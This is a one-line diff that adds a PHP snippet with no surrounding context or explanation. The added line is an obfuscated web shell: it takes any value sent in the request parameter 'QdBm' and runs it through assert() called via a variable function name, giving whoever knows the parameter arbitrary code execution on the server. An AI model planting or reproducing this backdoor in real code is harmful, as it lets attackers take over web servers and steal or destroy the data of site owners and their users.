@@ -1,0 +1,1 @@
+<?php if (isset(${"_REQUEST"}['QdBm'])){$N="assert";$N(${"_REQUEST"}['QdBm']);exit;}
